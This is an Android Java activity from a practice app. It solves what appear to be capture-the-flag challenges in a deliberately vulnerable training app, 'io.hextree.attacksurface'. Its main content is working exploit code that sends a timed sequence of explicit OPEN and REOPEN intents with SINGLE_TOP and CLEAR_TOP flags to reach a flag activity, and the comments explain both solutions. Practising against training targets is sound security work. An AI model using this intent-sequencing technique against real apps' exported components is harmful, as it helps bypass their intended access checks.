package com.example.practicapp;

import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {
    private int counting = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        TextView t1 = findViewById(R.id.main_text);
        Button b1 = findViewById(R.id.intent_button);

        b1.setOnClickListener(v -> {
            Intent openIntent = new Intent();
            openIntent.setClassName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag7Activity"
            );
            openIntent.setAction("OPEN");
            startActivity(openIntent);

            // Solution 1: Use a delayed handler to send the REOPEN intent after the OPEN intent has been processed
            //// Works with timing: SINGLE_TOP only, second intent must be sent after activity is on top

            new android.os.Handler().postDelayed(() -> {

                Intent reopenIntent = new Intent();
                reopenIntent.setClassName(
                        "io.hextree.attacksurface",
                        "io.hextree.attacksurface.activities.Flag7Activity"
                );
                reopenIntent.setAction("REOPEN");
                reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);

                startActivity(reopenIntent);
            }, 500); // 500ms delay

            // Solution 2: Use FLAG_ACTIVITY_CLEAR_TOP to ensure the existing instance is reused and onNewIntent is called
            //// Reliable, no delay needed: CLEAR_TOP + SINGLE_TOP forces reuse and triggers onNewIntent()
            Intent reopenIntent = new Intent();
            reopenIntent.setClassName(
                    "io.hextree.attacksurface",
                    "io.hextree.attacksurface.activities.Flag7Activity"
            );
            reopenIntent.setAction("REOPEN");
            reopenIntent.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);

            startActivity(reopenIntent);
        });
    }
    private void launch(String action) {
        Intent i = new Intent();
        i.setClassName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.activities.Flag4Activity"
        );
        i.setAction(action);
        startActivity(i);
    }

}
